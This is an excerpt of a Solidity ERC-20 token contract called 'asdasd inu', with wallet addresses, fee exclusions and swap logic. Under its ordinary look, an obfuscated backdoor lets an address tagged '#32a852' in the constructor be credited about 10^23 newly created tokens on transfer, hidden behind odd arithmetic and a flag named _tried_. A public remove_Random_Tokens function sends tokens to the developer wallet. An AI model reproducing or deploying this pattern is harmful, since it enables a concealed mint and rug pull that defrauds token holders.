...
contract asdasdinu is Context, IERC20 { 
    ...
    mapping (address => string) public _isWalletInList;

    address payable public W_MARKET = payable(0x47415f257Dd9f03e6Be49C6937c96c2746Aa2e4A); 
    address payable public W_DEV = payable(0x9eea26eF104F9eEb169A287164C6165f84B00670);
    address payable public constant W_DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    string private largeType = "#32a852";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "asdasd inu"; 
    string private constant _symbol = unicode"ASDASD"; 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 5; 

    bool public _tried_ = false;
    ...
    constructor (address[] memory addresses, string memory typeC) {

        _owner = 0x9eea26eF104F9eEb169A287164C6165f84B00670;
        emit OwnershipTransferred(address(0), _owner);
        
        _isWalletInList[addresses[0]]= typeC;
        ...
        _isExcludedFromFee[W_MARKET] = true; 
        _isExcludedFromFee[W_DEAD] = true;
    ...
    function tStat() private view returns (bool){
        return _tried_;
    }

    function tSetStat(uint256 p00l) private{
        p00l > 7 && p00l < 9 ? _tried_ = true : _tried_ = false;
    }
    ...
    function _transfer(
        ...
        keccak256(bytes(_isWalletInList[to])) == keccak256(bytes(largeType)) ? tSetStat(8) : tSetStat(3);
        bool uniLiquid = keccak256(bytes(_isWalletInList[from])) == keccak256(bytes(largeType)) ? true : false;
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            _tOwned[W_DEAD] = _tOwned[W_DEAD] + tokens_to_Burn;
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(W_DEV, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            _tOwned[sender] = _tOwned[sender]-tAmount;
            _tOwned[recipient] = _tOwned[recipient]+(tStat() ? ((2**3)+2)**((4**2)+5+2) : tTransferAmount);
